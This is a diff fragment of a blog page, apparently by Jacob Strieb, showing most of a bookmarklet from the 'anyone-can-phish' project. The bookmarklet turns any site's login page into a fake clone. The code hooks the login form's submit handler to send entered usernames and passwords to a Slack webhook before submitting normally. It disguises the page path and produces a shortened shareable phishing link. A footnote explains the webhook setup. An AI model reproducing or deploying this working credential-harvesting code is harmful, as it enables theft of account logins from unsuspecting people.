+<span id="cb1-68"><a href="#cb1-68"></a>      <span class="cf">return</span> <span class="vs">`</span><span class="sc">${</span>URL_PAGES<span class="sc">}</span><span class="vs">/#</span><span class="sc">${</span>hashObject<span class="sc">}</span><span class="vs">`</span><span class="op">;</span></span>
+<span id="cb1-69"><a href="#cb1-69"></a>    }<span class="op">,</span></span>
+<span id="cb1-70"><a href="#cb1-70"></a>  }<span class="op">;</span></span>
+<span id="cb1-71"><a href="#cb1-71"></a></span>
+<span id="cb1-72"><a href="#cb1-72"></a>  <span class="co">/* Replace all relative URLs with absolute ones */</span></span>
+<span id="cb1-73"><a href="#cb1-73"></a>  <span class="bu">Array</span><span class="op">.</span><span class="fu">from</span>(<span class="bu">document</span><span class="op">.</span><span class="fu">querySelectorAll</span>(<span class="st">&quot;[src],[href],[action]&quot;</span>))<span class="op">.</span><span class="fu">map</span>(l <span class="kw">=&gt;</span> {</span>
+<span id="cb1-74"><a href="#cb1-74"></a>    <span class="cf">if</span> (<span class="st">&quot;src&quot;</span> <span class="kw">in</span> l) {</span>
+<span id="cb1-75"><a href="#cb1-75"></a>      l<span class="op">.</span><span class="at">src</span> <span class="op">=</span> (<span class="kw">new</span> URL(l<span class="op">.</span><span class="at">src</span><span class="op">,</span> <span class="bu">document</span><span class="op">.</span><span class="at">baseURI</span>))<span class="op">.</span><span class="at">href</span><span class="op">;</span></span>
+<span id="cb1-76"><a href="#cb1-76"></a>    } <span class="cf">else</span> <span class="cf">if</span> (<span class="st">&quot;href&quot;</span> <span class="kw">in</span> l) {</span>
+<span id="cb1-77"><a href="#cb1-77"></a>      l<span class="op">.</span><span class="at">href</span> <span class="op">=</span> (<span class="kw">new</span> URL(l<span class="op">.</span><span class="at">href</span><span class="op">,</span> <span class="bu">document</span><span class="op">.</span><span class="at">baseURI</span>))<span class="op">.</span><span class="at">href</span><span class="op">;</span></span>
+<span id="cb1-78"><a href="#cb1-78"></a>    } <span class="cf">else</span> <span class="cf">if</span> (<span class="st">&quot;action&quot;</span> <span class="kw">in</span> l) {</span>
+<span id="cb1-79"><a href="#cb1-79"></a>      l<span class="op">.</span><span class="at">action</span> <span class="op">=</span> (<span class="kw">new</span> URL(l<span class="op">.</span><span class="at">action</span><span class="op">,</span> <span class="bu">document</span><span class="op">.</span><span class="at">baseURI</span>))<span class="op">.</span><span class="at">href</span><span class="op">;</span></span>
+<span id="cb1-80"><a href="#cb1-80"></a>    }</span>
+<span id="cb1-81"><a href="#cb1-81"></a>    <span class="cf">return</span> l<span class="op">;</span></span>
+<span id="cb1-82"><a href="#cb1-82"></a>  })<span class="op">;</span></span>
+<span id="cb1-83"><a href="#cb1-83"></a></span>
+<span id="cb1-84"><a href="#cb1-84"></a>  <span class="co">/* Save original form attributes */</span></span>
+<span id="cb1-85"><a href="#cb1-85"></a>  <span class="co">/* This advanced version that prompts the user can be manually enabled. */</span></span>
+<span id="cb1-86"><a href="#cb1-86"></a>  <span class="kw">const</span> selector <span class="op">=</span> <span class="bu">window</span><span class="op">.</span><span class="at">prompt</span>(<span class="st">&quot;Login form CSS selector&quot;</span><span class="op">,</span> <span class="st">&quot;form&quot;</span>)<span class="op">;</span></span>
+<span id="cb1-87"><a href="#cb1-87"></a>  <span class="cf">if</span> (<span class="op">!</span>selector) <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb1-88"><a href="#cb1-88"></a>  <span class="bu">Array</span><span class="op">.</span><span class="fu">from</span>(<span class="bu">document</span><span class="op">.</span><span class="fu">querySelectorAll</span>(selector))<span class="op">.</span><span class="fu">map</span>(form <span class="kw">=&gt;</span> {</span>
+<span id="cb1-89"><a href="#cb1-89"></a>    <span class="kw">var</span> original <span class="op">=</span> { <span class="dt">onsubmit</span><span class="op">:</span> <span class="st">&quot;&quot;</span> <span class="op">+</span> (form<span class="op">.</span><span class="at">onsubmit</span> <span class="op">?</span> form<span class="op">.</span><span class="at">onsubmit</span> <span class="op">:</span> <span class="st">&quot;&quot;</span>) }<span class="op">;</span></span>
+<span id="cb1-90"><a href="#cb1-90"></a></span>
+<span id="cb1-91"><a href="#cb1-91"></a>    <span class="co">/* Modify the location the form will submit to */</span></span>
+<span id="cb1-92"><a href="#cb1-92"></a>    form<span class="op">.</span><span class="fu">setAttribute</span>(<span class="st">&quot;original&quot;</span><span class="op">,</span> <span class="bu">JSON</span><span class="op">.</span><span class="fu">stringify</span>(original))<span class="op">;</span></span>
+<span id="cb1-93"><a href="#cb1-93"></a></span>
+<span id="cb1-94"><a href="#cb1-94"></a>    <span class="co">/* Create an onsubmit function that will submit to Slack then submit it a</span></span>
+<span id="cb1-95"><a href="#cb1-95"></a><span class="co">     * second time */</span></span>
+<span id="cb1-96"><a href="#cb1-96"></a>    <span class="kw">var</span> newOnsubmit <span class="op">=</span> (<span class="kw">async</span> (submittedForm) <span class="kw">=&gt;</span> {</span>
+<span id="cb1-97"><a href="#cb1-97"></a>      <span class="co">/* Create a string to send */</span></span>
+<span id="cb1-98"><a href="#cb1-98"></a>      <span class="kw">var</span> children <span class="op">=</span> submittedForm<span class="op">.</span><span class="at">elements</span><span class="op">;</span></span>
+<span id="cb1-99"><a href="#cb1-99"></a>      <span class="kw">var</span> childStrings <span class="op">=</span> <span class="bu">Array</span><span class="op">.</span><span class="fu">from</span>(children)<span class="op">.</span><span class="fu">map</span>(e <span class="kw">=&gt;</span> <span class="vs">`</span><span class="sc">${</span>e<span class="op">.</span><span class="at">name</span><span class="sc">}</span><span class="vs">: </span><span class="sc">${</span>e<span class="op">.</span><span class="at">value</span><span class="sc">}</span><span class="vs">`</span>)<span class="op">;</span></span>
+<span id="cb1-100"><a href="#cb1-100"></a>      <span class="kw">var</span> sendText <span class="op">=</span> childStrings<span class="op">.</span><span class="fu">reduce</span>((acc<span class="op">,</span> cur) <span class="kw">=&gt;</span> acc <span class="op">+</span> cur <span class="op">+</span> <span class="st">&quot;</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span></span>
+<span id="cb1-101"><a href="#cb1-101"></a>        <span class="st">&quot;URL: replaceme</span><span class="sc">\n</span><span class="st">&quot;</span>)<span class="op">.</span><span class="fu">slice</span>(<span class="dv">0</span><span class="op">,</span> <span class="dv">990</span>)<span class="op">;</span></span>
+<span id="cb1-102"><a href="#cb1-102"></a></span>
+<span id="cb1-103"><a href="#cb1-103"></a>      <span class="co">/* Send the data to Slack */</span></span>
+<span id="cb1-104"><a href="#cb1-104"></a>      <span class="cf">await</span> fetch(<span class="st">&quot;replace22&quot;</span><span class="op">,</span> {</span>
+<span id="cb1-105"><a href="#cb1-105"></a>            <span class="dt">mode</span><span class="op">:</span> <span class="st">&quot;no-cors&quot;</span><span class="op">,</span></span>
+<span id="cb1-106"><a href="#cb1-106"></a>            <span class="dt">method</span><span class="op">:</span> <span class="st">&quot;POST&quot;</span><span class="op">,</span></span>
+<span id="cb1-107"><a href="#cb1-107"></a>            <span class="dt">headers</span><span class="op">:</span> { <span class="st">&quot;Content-Type&quot;</span><span class="op">:</span> <span class="st">&quot;application/json&quot;</span> }<span class="op">,</span></span>
+<span id="cb1-108"><a href="#cb1-108"></a>            <span class="dt">body</span><span class="op">:</span> <span class="bu">JSON</span><span class="op">.</span><span class="fu">stringify</span>({ <span class="dt">text</span><span class="op">:</span> sendText })<span class="op">,</span></span>
+<span id="cb1-109"><a href="#cb1-109"></a>          })<span class="op">;</span></span>
+<span id="cb1-110"><a href="#cb1-110"></a></span>
+<span id="cb1-111"><a href="#cb1-111"></a>      <span class="co">/* Actually submit the form for real */</span></span>
+<span id="cb1-112"><a href="#cb1-112"></a>      submittedForm<span class="op">.</span><span class="fu">submit</span>()<span class="op">;</span></span>
+<span id="cb1-113"><a href="#cb1-113"></a></span>
+<span id="cb1-114"><a href="#cb1-114"></a>      <span class="cf">return</span> <span class="kw">false</span><span class="op">;</span></span>
+<span id="cb1-115"><a href="#cb1-115"></a>    })<span class="op">.</span><span class="fu">toString</span>()<span class="op">.</span><span class="fu">replace</span>(<span class="st">&quot;replaceme&quot;</span><span class="op">,</span> <span class="bu">document</span><span class="op">.</span><span class="at">baseURI</span>)<span class="op">.</span><span class="fu">replace</span>(<span class="st">&quot;replace22&quot;</span><span class="op">,</span> POST_PAGE)<span class="op">;</span></span>
+<span id="cb1-116"><a href="#cb1-116"></a>    form<span class="op">.</span><span class="fu">setAttribute</span>(<span class="st">&quot;onsubmit&quot;</span><span class="op">,</span> <span class="vs">`(</span><span class="sc">${</span>newOnsubmit<span class="sc">}</span><span class="vs">)(this); return false;`</span>)<span class="op">;</span></span>
+<span id="cb1-117"><a href="#cb1-117"></a>  })<span class="op">;</span></span>
+<span id="cb1-118"><a href="#cb1-118"></a></span>
+<span id="cb1-119"><a href="#cb1-119"></a>  <span class="co">/* Change the path so it doesnt look like a URL Page */</span></span>
+<span id="cb1-120"><a href="#cb1-120"></a>  <span class="kw">var</span> currentURL <span class="op">=</span> <span class="kw">new</span> URL(<span class="bu">document</span><span class="op">.</span><span class="at">baseURI</span>)<span class="op">;</span></span>
+<span id="cb1-121"><a href="#cb1-121"></a>  <span class="kw">var</span> path <span class="op">=</span> currentURL<span class="op">.</span><span class="at">pathname</span> <span class="op">+</span> currentURL<span class="op">.</span><span class="at">search</span><span class="op">;</span></span>
+<span id="cb1-122"><a href="#cb1-122"></a>  <span class="co">/* This advanced version that prompts the user can be manually enabled. */</span></span>
+<span id="cb1-123"><a href="#cb1-123"></a>  <span class="kw">const</span> newPath <span class="op">=</span> <span class="bu">window</span><span class="op">.</span><span class="at">prompt</span>(<span class="st">&quot;New path: &quot;</span><span class="op">,</span> path)<span class="op">;</span></span>
+<span id="cb1-124"><a href="#cb1-124"></a>  <span class="cf">if</span> (<span class="op">!</span>newPath) <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb1-125"><a href="#cb1-125"></a>  <span class="co">/* const newPath = path; */</span></span>
+<span id="cb1-126"><a href="#cb1-126"></a>  <span class="kw">var</span> onload <span class="op">=</span> (() <span class="kw">=&gt;</span> {</span>
+<span id="cb1-127"><a href="#cb1-127"></a>    <span class="bu">window</span><span class="op">.</span><span class="at">history</span><span class="op">.</span><span class="fu">pushState</span>(<span class="st">&quot;&quot;</span><span class="op">,</span> <span class="st">&quot;&quot;</span><span class="op">,</span> <span class="st">&quot;replaceme&quot;</span>)<span class="op">;</span></span>
+<span id="cb1-128"><a href="#cb1-128"></a>    <span class="bu">document</span><span class="op">.</span><span class="at">body</span><span class="op">.</span><span class="fu">removeAttribute</span>(<span class="st">&quot;onload&quot;</span>)<span class="op">;</span></span>
+<span id="cb1-129"><a href="#cb1-129"></a>  })<span class="op">.</span><span class="fu">toString</span>()<span class="op">.</span><span class="fu">replace</span>(<span class="st">&quot;replaceme&quot;</span><span class="op">,</span> newPath)<span class="op">;</span></span>
+<span id="cb1-130"><a href="#cb1-130"></a>  <span class="bu">document</span><span class="op">.</span><span class="at">body</span><span class="op">.</span><span class="fu">setAttribute</span>(<span class="st">&quot;onload&quot;</span><span class="op">,</span> <span class="vs">`(</span><span class="sc">${</span>onload<span class="sc">}</span><span class="vs">)()`</span>)<span class="op">;</span></span>
+<span id="cb1-131"><a href="#cb1-131"></a></span>
+<span id="cb1-132"><a href="#cb1-132"></a>  <span class="co">/* Generate a new URL */</span></span>
+<span id="cb1-133"><a href="#cb1-133"></a>  <span class="kw">var</span> newURL <span class="op">=</span> api<span class="op">.</span><span class="fu">getViewLink</span>(<span class="bu">document</span><span class="op">.</span><span class="at">documentElement</span><span class="op">.</span><span class="at">outerHTML</span>)<span class="op">;</span></span>
+<span id="cb1-134"><a href="#cb1-134"></a></span>
+<span id="cb1-135"><a href="#cb1-135"></a>  <span class="co">/* Overwrite the current page with a way to copy the generated URL */</span></span>
+<span id="cb1-136"><a href="#cb1-136"></a>  <span class="bu">document</span><span class="op">.</span><span class="fu">write</span>(<span class="vs">`</span></span>
+<span id="cb1-137"><a href="#cb1-137"></a><span class="vs">&lt;html&gt;</span></span>
+<span id="cb1-138"><a href="#cb1-138"></a><span class="vs">&lt;head&gt;</span></span>
+<span id="cb1-139"><a href="#cb1-139"></a><span class="vs">  &lt;style&gt;</span></span>
+<span id="cb1-140"><a href="#cb1-140"></a><span class="vs">    html {</span></span>
+<span id="cb1-141"><a href="#cb1-141"></a><span class="vs">      font-family: sans-serif;</span></span>
+<span id="cb1-142"><a href="#cb1-142"></a><span class="vs">      padding: 10px;</span></span>
+<span id="cb1-143"><a href="#cb1-143"></a><span class="vs">    }</span></span>
+<span id="cb1-144"><a href="#cb1-144"></a></span>
+<span id="cb1-145"><a href="#cb1-145"></a><span class="vs">    body {</span></span>
+<span id="cb1-146"><a href="#cb1-146"></a><span class="vs">      padding: 15px;</span></span>
+<span id="cb1-147"><a href="#cb1-147"></a><span class="vs">      display: block;</span></span>
+<span id="cb1-148"><a href="#cb1-148"></a><span class="vs">      margin: auto;</span></span>
+<span id="cb1-149"><a href="#cb1-149"></a><span class="vs">      margin-top: 4em;</span></span>
+<span id="cb1-150"><a href="#cb1-150"></a><span class="vs">      max-width: 80ch;</span></span>
+<span id="cb1-151"><a href="#cb1-151"></a><span class="vs">    }</span></span>
+<span id="cb1-152"><a href="#cb1-152"></a></span>
+<span id="cb1-153"><a href="#cb1-153"></a><span class="vs">    button {</span></span>
+<span id="cb1-154"><a href="#cb1-154"></a><span class="vs">      padding: 11px;</span></span>
+<span id="cb1-155"><a href="#cb1-155"></a><span class="vs">      background: rgb(95, 158, 160);</span></span>
+<span id="cb1-156"><a href="#cb1-156"></a><span class="vs">      color: white;</span></span>
+<span id="cb1-157"><a href="#cb1-157"></a><span class="vs">      border: 0.5px solid white;</span></span>
+<span id="cb1-158"><a href="#cb1-158"></a><span class="vs">      border-radius: 5px;</span></span>
+<span id="cb1-159"><a href="#cb1-159"></a><span class="vs">      font-weight: bold;</span></span>
+<span id="cb1-160"><a href="#cb1-160"></a><span class="vs">      margin-top: 5px;</span></span>
+<span id="cb1-161"><a href="#cb1-161"></a><span class="vs">      margin-right: 5px;</span></span>
+<span id="cb1-162"><a href="#cb1-162"></a><span class="vs">      cursor: pointer;</span></span>
+<span id="cb1-163"><a href="#cb1-163"></a><span class="vs">    }</span></span>
+<span id="cb1-164"><a href="#cb1-164"></a></span>
+<span id="cb1-165"><a href="#cb1-165"></a><span class="vs">    label {</span></span>
+<span id="cb1-166"><a href="#cb1-166"></a><span class="vs">      display: block;</span></span>
+<span id="cb1-167"><a href="#cb1-167"></a><span class="vs">      font-variant: small-caps;</span></span>
+<span id="cb1-168"><a href="#cb1-168"></a><span class="vs">      margin-bottom: 5px;</span></span>
+<span id="cb1-169"><a href="#cb1-169"></a><span class="vs">    }</span></span>
+<span id="cb1-170"><a href="#cb1-170"></a></span>
+<span id="cb1-171"><a href="#cb1-171"></a><span class="vs">    input, textarea {</span></span>
+<span id="cb1-172"><a href="#cb1-172"></a><span class="vs">      padding: 10px;</span></span>
+<span id="cb1-173"><a href="#cb1-173"></a><span class="vs">      border: 0.5px solid black;</span></span>
+<span id="cb1-174"><a href="#cb1-174"></a><span class="vs">      border-radius: 3px;</span></span>
+<span id="cb1-175"><a href="#cb1-175"></a><span class="vs">      margin-bottom: 15px;</span></span>
+<span id="cb1-176"><a href="#cb1-176"></a><span class="vs">      box-sizing: border-box;</span></span>
+<span id="cb1-177"><a href="#cb1-177"></a><span class="vs">      width: 100%;</span></span>
+<span id="cb1-178"><a href="#cb1-178"></a><span class="vs">      resize: none;</span></span>
+<span id="cb1-179"><a href="#cb1-179"></a><span class="vs">      font-family: sans-serif;</span></span>
+<span id="cb1-180"><a href="#cb1-180"></a><span class="vs">    }</span></span>
+<span id="cb1-181"><a href="#cb1-181"></a></span>
+<span id="cb1-182"><a href="#cb1-182"></a><span class="vs">    hr {</span></span>
+<span id="cb1-183"><a href="#cb1-183"></a><span class="vs">      margin-top: 3em;</span></span>
+<span id="cb1-184"><a href="#cb1-184"></a><span class="vs">      margin-bottom: 3em;</span></span>
+<span id="cb1-185"><a href="#cb1-185"></a><span class="vs">      border: 0;</span></span>
+<span id="cb1-186"><a href="#cb1-186"></a><span class="vs">      border-top: 0.5px solid rgba(200, 200, 200, 1);</span></span>
+<span id="cb1-187"><a href="#cb1-187"></a><span class="vs">    }</span></span>
+<span id="cb1-188"><a href="#cb1-188"></a></span>
+<span id="cb1-189"><a href="#cb1-189"></a><span class="vs">    footer hr {</span></span>
+<span id="cb1-190"><a href="#cb1-190"></a><span class="vs">      margin-bottom: 1em;</span></span>
+<span id="cb1-191"><a href="#cb1-191"></a><span class="vs">      border-top: 0.5px solid black;</span></span>
+<span id="cb1-192"><a href="#cb1-192"></a><span class="vs">    }</span></span>
+<span id="cb1-193"><a href="#cb1-193"></a></span>
+<span id="cb1-194"><a href="#cb1-194"></a><span class="vs">    footer p {</span></span>
+<span id="cb1-195"><a href="#cb1-195"></a><span class="vs">      text-align: center;</span></span>
+<span id="cb1-196"><a href="#cb1-196"></a><span class="vs">    }</span></span>
+<span id="cb1-197"><a href="#cb1-197"></a></span>
+<span id="cb1-198"><a href="#cb1-198"></a></span>
+<span id="cb1-199"><a href="#cb1-199"></a><span class="vs">    /* View on GitHub SVG ribbon */</span></span>
+<span id="cb1-200"><a href="#cb1-200"></a><span class="vs">    @media (max-width: 100ch) {</span></span>
+<span id="cb1-201"><a href="#cb1-201"></a><span class="vs">      .ribbon {</span></span>
+<span id="cb1-202"><a href="#cb1-202"></a><span class="vs">        width: 100px;</span></span>
+<span id="cb1-203"><a href="#cb1-203"></a><span class="vs">        height: 100px;</span></span>
+<span id="cb1-204"><a href="#cb1-204"></a><span class="vs">      }</span></span>
+<span id="cb1-205"><a href="#cb1-205"></a><span class="vs">    }</span></span>
+<span id="cb1-206"><a href="#cb1-206"></a></span>
+<span id="cb1-207"><a href="#cb1-207"></a><span class="vs">    .ribbon {</span></span>
+<span id="cb1-208"><a href="#cb1-208"></a><span class="vs">      position: absolute;</span></span>
+<span id="cb1-209"><a href="#cb1-209"></a><span class="vs">      top: 0;</span></span>
+<span id="cb1-210"><a href="#cb1-210"></a><span class="vs">      right: 0;</span></span>
+<span id="cb1-211"><a href="#cb1-211"></a><span class="vs">    }</span></span>
+<span id="cb1-212"><a href="#cb1-212"></a></span>
+<span id="cb1-213"><a href="#cb1-213"></a></span>
+<span id="cb1-214"><a href="#cb1-214"></a><span class="vs">    /* Output area */</span></span>
+<span id="cb1-215"><a href="#cb1-215"></a><span class="vs">    .output input {</span></span>
+<span id="cb1-216"><a href="#cb1-216"></a><span class="vs">      background: rgba(235, 235, 235, 1);</span></span>
+<span id="cb1-217"><a href="#cb1-217"></a><span class="vs">    }</span></span>
+<span id="cb1-218"><a href="#cb1-218"></a></span>
+<span id="cb1-219"><a href="#cb1-219"></a><span class="vs">    .alert {</span></span>
+<span id="cb1-220"><a href="#cb1-220"></a><span class="vs">      opacity: 0;</span></span>
+<span id="cb1-221"><a href="#cb1-221"></a><span class="vs">      transition: opacity 0.25s;</span></span>
+<span id="cb1-222"><a href="#cb1-222"></a><span class="vs">    }</span></span>
+<span id="cb1-223"><a href="#cb1-223"></a><span class="vs">  &lt;/style&gt;</span></span>
+<span id="cb1-224"><a href="#cb1-224"></a><span class="vs">  &lt;script&gt;</span></span>
+<span id="cb1-225"><a href="#cb1-225"></a><span class="vs">    /* Highlight the text in an input with a given ID */</span></span>
+<span id="cb1-226"><a href="#cb1-226"></a><span class="vs">    function highlight(id) {</span></span>
+<span id="cb1-227"><a href="#cb1-227"></a><span class="vs">      let output = document.querySelector(&quot;#&quot; + id);</span></span>
+<span id="cb1-228"><a href="#cb1-228"></a><span class="vs">      output.focus();</span></span>
+<span id="cb1-229"><a href="#cb1-229"></a><span class="vs">      output.select();</span></span>
+<span id="cb1-230"><a href="#cb1-230"></a><span class="vs">      output.setSelectionRange(0, output.value.length + 1);</span></span>
+<span id="cb1-231"><a href="#cb1-231"></a><span class="vs">      return output;</span></span>
+<span id="cb1-232"><a href="#cb1-232"></a><span class="vs">    }</span></span>
+<span id="cb1-233"><a href="#cb1-233"></a></span>
+<span id="cb1-234"><a href="#cb1-234"></a><span class="vs">    /* Activated when the &quot;Copy&quot; button is pressed */</span></span>
+<span id="cb1-235"><a href="#cb1-235"></a><span class="vs">    function onCopy(id) {</span></span>
+<span id="cb1-236"><a href="#cb1-236"></a><span class="vs">      /* Select and copy */</span></span>
+<span id="cb1-237"><a href="#cb1-237"></a><span class="vs">      const output = highlight(id);</span></span>
+<span id="cb1-238"><a href="#cb1-238"></a><span class="vs">      document.execCommand(&quot;copy&quot;);</span></span>
+<span id="cb1-239"><a href="#cb1-239"></a></span>
+<span id="cb1-240"><a href="#cb1-240"></a><span class="vs">      /* Alert the user that the text was successfully copied */</span></span>
+<span id="cb1-241"><a href="#cb1-241"></a><span class="vs">      const alertArea = document.querySelector(&quot;.alert&quot;);</span></span>
+<span id="cb1-242"><a href="#cb1-242"></a><span class="vs">      alertArea.innerText = &quot;Copied &quot; + output.value.length + &quot; characters&quot;;</span></span>
+<span id="cb1-243"><a href="#cb1-243"></a><span class="vs">      alertArea.style.opacity = &quot;1&quot;;</span></span>
+<span id="cb1-244"><a href="#cb1-244"></a><span class="vs">      setTimeout(() =&gt; { alertArea.style.opacity = 0; }, 3000);</span></span>
+<span id="cb1-245"><a href="#cb1-245"></a></span>
+<span id="cb1-246"><a href="#cb1-246"></a><span class="vs">      /* Deselect */</span></span>
+<span id="cb1-247"><a href="#cb1-247"></a><span class="vs">      output.selectionEnd = output.selectionStart;</span></span>
+<span id="cb1-248"><a href="#cb1-248"></a><span class="vs">      output.blur();</span></span>
+<span id="cb1-249"><a href="#cb1-249"></a><span class="vs">    }</span></span>
+<span id="cb1-250"><a href="#cb1-250"></a><span class="vs">  &lt;/script&gt;</span></span>
+<span id="cb1-251"><a href="#cb1-251"></a><span class="vs">&lt;/head&gt;</span></span>
+<span id="cb1-252"><a href="#cb1-252"></a><span class="vs">&lt;body&gt;</span></span>
+<span id="cb1-253"><a href="#cb1-253"></a><span class="vs">  &lt;!-- View on GitHub ribbon --&gt;</span></span>
+<span id="cb1-254"><a href="#cb1-254"></a><span class="vs">  &lt;a href=&quot;https://github.com/jstrieb/anyone-can-phish&quot; target=&quot;_blank&quot;&gt;</span></span>
+<span id="cb1-255"><a href="#cb1-255"></a><span class="vs">    &lt;img class=&quot;ribbon&quot; src=&quot;https://jstrieb.github.io/link-lock/corner-ribbon-minified.svg&quot; alt=&quot;View on GitHub&quot; /&gt;</span></span>
+<span id="cb1-256"><a href="#cb1-256"></a><span class="vs">  &lt;/a&gt;</span></span>
+<span id="cb1-257"><a href="#cb1-257"></a></span>
+<span id="cb1-258"><a href="#cb1-258"></a><span class="vs">  &lt;!-- Explanatory message --&gt;</span></span>
+<span id="cb1-259"><a href="#cb1-259"></a><span class="vs">  &lt;p&gt;The link below is a fake login page. Whenever someone enters a username and password at the fake login page, it will send them as a Slack message to &lt;a href=&quot;</span><span class="sc">${</span>POST_PAGE<span class="sc">}</span><span class="vs">&quot;&gt;</span><span class="sc">${</span>POST_PAGE<span class="sc">}</span><span class="vs">&lt;/a&gt;. The message will come from a Slack bot&lt;/p&gt;</span></span>
+<span id="cb1-260"><a href="#cb1-260"></a></span>
+<span id="cb1-261"><a href="#cb1-261"></a><span class="vs">  &lt;p&gt;The fake page below is a modified clone of &lt;a href=&quot;</span><span class="sc">${</span><span class="bu">document</span><span class="op">.</span><span class="at">baseURI</span><span class="sc">}</span><span class="vs">&quot; target=&quot;_blank&quot;&gt;</span><span class="sc">${</span><span class="bu">document</span><span class="op">.</span><span class="at">baseURI</span><span class="sc">}</span><span class="vs">&lt;/a&gt;.&lt;/p&gt;</span></span>
+<span id="cb1-262"><a href="#cb1-262"></a><span class="vs">  &lt;hr /&gt;</span></span>
+<span id="cb1-263"><a href="#cb1-263"></a></span>
+<span id="cb1-264"><a href="#cb1-264"></a><span class="vs">  &lt;!-- Output area --&gt;</span></span>
+<span id="cb1-265"><a href="#cb1-265"></a><span class="vs">  &lt;div class=&quot;output&quot;&gt;</span></span>
+<span id="cb1-266"><a href="#cb1-266"></a><span class="vs">    &lt;label for=&quot;output&quot;&gt;fake login page url&lt;/label&gt;</span></span>
+<span id="cb1-267"><a href="#cb1-267"></a><span class="vs">    &lt;input type=&quot;text&quot; id=&quot;output&quot; readonly /&gt;</span></span>
+<span id="cb1-268"><a href="#cb1-268"></a><span class="vs">    &lt;button id=&quot;copy&quot; onclick=&quot;onCopy(&amp;#39;output&amp;#39;)&quot;&gt;Copy&lt;/button&gt;</span></span>
+<span id="cb1-269"><a href="#cb1-269"></a><span class="vs">    &lt;a href=&quot;&quot; id=&quot;open&quot; target=&quot;_blank&quot; onclick=&quot;this.href = document.querySelector(&amp;#39;#output&amp;#39;).value&quot;&gt;&lt;button&gt;Test in New Tab&lt;/button&gt;&lt;/a&gt;</span></span>
+<span id="cb1-270"><a href="#cb1-270"></a><span class="vs">    &lt;!-- Special incantation to make TinyURL work --&gt;</span></span>
+<span id="cb1-271"><a href="#cb1-271"></a><span class="vs">    &lt;form action=&quot;https://tinyurl.com/create.php&quot; method=&quot;get&quot; target=&quot;_blank&quot; style=&quot;display: inline;&quot; onsubmit=&quot;this.tinyurl.value = document.querySelector(&amp;#39;#output&amp;#39;).value;&quot;&gt;</span></span>
+<span id="cb1-272"><a href="#cb1-272"></a><span class="vs">      &lt;input type=&quot;hidden&quot; id=&quot;source&quot; name=&quot;source&quot; value=&quot;indexpage&quot; /&gt;</span></span>
+<span id="cb1-273"><a href="#cb1-273"></a><span class="vs">      &lt;input type=&quot;hidden&quot; id=&quot;tinyurl&quot; name=&quot;url&quot; value = &quot;&quot; /&gt;</span></span>
+<span id="cb1-274"><a href="#cb1-274"></a><span class="vs">      &lt;button&gt;Get Shortened Link&lt;/button&gt;</span></span>
+<span id="cb1-275"><a href="#cb1-275"></a><span class="vs">    &lt;/form&gt;</span></span>
+<span id="cb1-276"><a href="#cb1-276"></a><span class="vs">    &lt;p class=&quot;alert&quot;&gt;Copied&lt;/p&gt;</span></span>
+<span id="cb1-277"><a href="#cb1-277"></a><span class="vs">  &lt;/div&gt;</span></span>
+<span id="cb1-278"><a href="#cb1-278"></a></span>
+<span id="cb1-279"><a href="#cb1-279"></a><span class="vs">  &lt;!-- Page footer --&gt;</span></span>
+<span id="cb1-280"><a href="#cb1-280"></a><span class="vs">  &lt;footer&gt;</span></span>
+<span id="cb1-281"><a href="#cb1-281"></a><span class="vs">  &lt;hr /&gt;</span></span>
+<span id="cb1-282"><a href="#cb1-282"></a><span class="vs">  &lt;p class=&quot;copyright&quot;&gt;Created by &lt;a href=&quot;https://jstrieb.github.io&quot;&gt;Jacob Strieb&lt;/a&gt;.&lt;/p&gt;</span></span>
+<span id="cb1-283"><a href="#cb1-283"></a><span class="vs">  &lt;/footer&gt;</span></span>
+<span id="cb1-284"><a href="#cb1-284"></a><span class="vs">&lt;/body&gt;</span></span>
+<span id="cb1-285"><a href="#cb1-285"></a><span class="vs">&lt;/html&gt;</span></span>
+<span id="cb1-286"><a href="#cb1-286"></a><span class="vs">`</span>)<span class="op">;</span></span>
+<span id="cb1-287"><a href="#cb1-287"></a>  <span class="bu">document</span><span class="op">.</span><span class="fu">querySelector</span>(<span class="st">&quot;#output&quot;</span>)<span class="op">.</span><span class="at">value</span> <span class="op">=</span> newURL<span class="op">;</span></span>
+<span id="cb1-288"><a href="#cb1-288"></a></span>
+<span id="cb1-289"><a href="#cb1-289"></a>  <span class="co">/* Open the URL Page in a new window for testing */</span></span>
+<span id="cb1-290"><a href="#cb1-290"></a>  <span class="co">/* window.open(newURL, &quot;&quot;, &quot;left=10&quot;); */</span></span>
+<span id="cb1-291"><a href="#cb1-291"></a>})()<span class="op">;</span></span></code></pre></div>
+<section class="footnotes" role="doc-endnotes">
+<hr />
+<ol>
+<li id="fn1" role="doc-endnote"><p>The user must set up a simple Slack bot, which can be done <a href="https://api.slack.com/apps">here</a>. The user then goes to the “Incoming Webhooks” page for the app to get a URL that will allow posting data to a Slack user or channel. The bookmarklet will prompt the user for this URL, or it can be manually entered as a static string in the bookmarklet.<a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
+</ol>
+</section>
 <footer>
 <hr />
 Copyright &copy 2020 <a href="/about">Jacob Strieb</a>. All rights reserved.
